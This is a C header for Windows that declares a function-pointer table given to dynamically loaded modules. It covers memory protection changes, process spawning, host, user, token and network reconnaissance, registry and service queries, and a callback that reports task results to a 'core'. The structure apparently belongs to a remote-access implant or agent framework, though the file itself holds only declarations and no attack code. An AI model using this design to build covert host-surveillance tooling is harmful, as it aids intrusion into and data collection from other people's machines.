#ifndef SPHINX_API_TABLE_H
#define SPHINX_API_TABLE_H

/* Force API level Vista+ (0x0601). The whole project depends on Vista+ symbols:
   GetTickCount64, LCIDToLocaleName, RtlGetVersion, IP_ADAPTER_ADDRESSES_LH, etc.
   Without this, mingw-w64 with its default XP target (e.g. the build container)
   hides those symbols and the build fails with "undeclared". */
#ifdef _WIN32_WINNT
#undef _WIN32_WINNT
#endif
#define _WIN32_WINNT 0x0601
#ifdef WINVER
#undef WINVER
#endif
#define WINVER 0x0601

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2ipdef.h>
#include <windows.h>
#define SECURITY_WIN32
#include <secext.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <iphlpapi.h>
#include <winhttp.h>

/* ── ApiTable: all functions available to a loaded module ── */
typedef struct {
    /* ── Memoria ── */
    void*   (*malloc)(size_t);
    void    (*free)(void*);
    LPVOID  (*VirtualAlloc)(LPVOID lpAddr, SIZE_T dwSize, DWORD flAllocType, DWORD flProtect);
    BOOL    (*VirtualFree)(LPVOID lpAddr, SIZE_T dwSize, DWORD dwFreeType);
    BOOL    (*VirtualProtect)(LPVOID lpAddr, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    void*   (*memcpy)(void* dst, const void* src, size_t n);
    void*   (*memset)(void* ptr, int value, size_t n);
    size_t  (*strlen)(const char* str);
    HGLOBAL (*GlobalFree)(HGLOBAL hMem);

    /* ── Procesos ── */
    BOOL    (*CreateProcessW)(LPCWSTR lpAppName, LPWSTR lpCmdLine,
                               LPSECURITY_ATTRIBUTES lpProcAttrs, LPSECURITY_ATTRIBUTES lpThreadAttrs,
                              BOOL bInheritHandles, DWORD dwCreationFlags,
                              LPVOID lpEnv, LPCWSTR lpCurDir,
                              LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcInfo);
    BOOL    (*CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe,
                           LPSECURITY_ATTRIBUTES lpPipeAttrs, DWORD nSize);
    BOOL    (*ReadFile)(HANDLE hFile, LPVOID lpBuf, DWORD nToRead,
                        LPDWORD lpRead, LPOVERLAPPED lpOverlapped);
    BOOL    (*WriteFile)(HANDLE hFile, const void* lpBuf, DWORD nToWrite,
                         LPDWORD lpWritten, LPOVERLAPPED lpOverlapped);
    BOOL    (*CloseHandle)(HANDLE hObject);
    DWORD   (*GetLastError)(void);
    void    (*Sleep)(DWORD dwMs);

    /* ── System ── */
    DWORD   (*GetCurrentDirectoryW)(DWORD nBufLen, LPWSTR lpBuf);
    BOOL    (*SetCurrentDirectoryW)(LPCWSTR lpPathName);
    DWORD   (*GetTempPathW)(DWORD nBufLen, LPWSTR lpBuf);
    HANDLE  (*FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
    BOOL    (*FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
    BOOL    (*FindClose)(HANDLE hFindFile);
    HANDLE  (*CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
    BOOL    (*Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
    BOOL    (*Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
    BOOL    (*GetComputerNameW)(LPWSTR lpBuffer, LPDWORD nSize);
    BOOLEAN (*GetUserNameExW)(EXTENDED_NAME_FORMAT NameFormat, LPWSTR lpNameBuffer, PULONG nSize);
    DWORD   (*GetCurrentProcessId)();
    DWORD   (*GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
    NTSTATUS    (*RtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);
    ULONGLONG   (*GetTickCount64)();
    BOOL    (*GlobalMemoryStatusEx)(LPMEMORYSTATUSEX lpBuffer);
    void    (*GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
    int     (*GetSystemMetrics)(int nIndex);
    DWORD   (*GetTimeZoneInformation)(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
    LCID    (*GetUserDefaultLCID)();
    LANGID  (*GetUserDefaultUILanguage)();
    DWORD   (*GetLogicalDrives)();
    UINT    (*GetDriveTypeW)(LPCWSTR lpRootPathName);
    HANDLE  (*GetCurrentProcess)(void);        // kernel32
    BOOL    (*OpenProcessToken)(HANDLE hTokenHandle, DWORD dwDesiredAccess, PHANDLE phNewToken);
    BOOL    (*GetTokenInformation)(HANDLE hTokenHandle, TOKEN_INFORMATION_CLASS tokenInfoClass,
                                   LPVOID tokenInfo, DWORD tokenInfoLength, PDWORD returnLength);
    BOOL    (*GetDiskFreeSpaceExW)(LPCWSTR lpDirectoryName,
            PULARGE_INTEGER lpFreeBytesAvailableToCaller,
            PULARGE_INTEGER lpTotalNumberOfBytes,
            PULARGE_INTEGER lpTotalNumberOfFreeBytes);
    UINT    (*GetWindowsDirectoryW)(LPWSTR lpBuffer, UINT uSize);
    UINT    (*GetSystemDirectoryW)(LPWSTR lpBuffer, UINT uSize);
    int     (*MultiByteToWideChar)(UINT CodePage,
        DWORD dwFlags,
        LPCCH lpMultiByteStr,
        int cbMultiByte,
        LPWSTR lpWideCharStr,
        int cchWideChar);
    int     (*WideCharToMultiByte)(UINT CodePage,
        DWORD dwFlags,
        LPCWCH lpWideCharStr,
        int cchWideChar,
        LPSTR lpMultiByteStr,
        int cbMultiByte,
        LPCCH lpDefaultChar,
        LPBOOL lpUsedDefaultChar);

    /* ── Network ── */
    ULONG (*GetAdaptersAddresses)(ULONG Family, ULONG Flags, PVOID Reserved,
        PIP_ADAPTER_ADDRESSES AdapterAddresses,
        PULONG SizePointer);
    DWORD (*GetExtendedTcpTable)(PVOID pTcpTable, PDWORD pdwSize, BOOL bOrder,
        ULONG ulAf, TCP_TABLE_CLASS TableClass, ULONG Reserved);
    DWORD (*GetExtendedUdpTable)(PVOID pUdpTable, PDWORD pdwSize, BOOL bOrder,
        ULONG ulAf, UDP_TABLE_CLASS TableClass, ULONG Reserved);
    DWORD   (*GetIpForwardTable)(PMIB_IPFORWARDTABLE pIpForwardTable,PULONG pdwSize, BOOL bOrder);
    ULONG   (*GetIpNetTable)(PMIB_IPNETTABLE IpNetTable,PULONG SizePointer, BOOL Order);
    BOOL    (*WinHttpGetIEProxyConfigForCurrentUser)(WINHTTP_CURRENT_USER_IE_PROXY_CONFIG *pProxyConfig);

    /* ── Registry ── */
    LSTATUS (*RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
    LSTATUS (*RegQueryValueExW)(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
    LSTATUS (*RegEnumValueW)(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName,
                             LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
    LSTATUS (*RegCloseKey)(HKEY hKey);

    /* ── Services ── */
    SC_HANDLE (*OpenSCManagerW)(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
    SC_HANDLE (*OpenServiceW)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
    BOOL (*QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
    BOOL (*CloseServiceHandle)(SC_HANDLE hSCObject);

    /* ── Formatting ── */
    int     (*sprintf)(char* buf, const char* fmt, ...);
    long int    (*labs)(long int x);
    int     (*LCIDToLocaleName)(LCID Locale, LPWSTR lpName, int cchName, DWORD dwFlags);

    /* ── Communication (routed through the core) ── */
    void    (*report_result)(const char* task_uuid, const uint8_t* data, size_t len, uint8_t status);

} ApiTable;

/* ── Global instance ── */
extern ApiTable g_api;

/* ── Populate g_api with real function pointers (call once at startup) ── */
void init_api_table(void);

#endif //SPHINX_API_TABLE_H
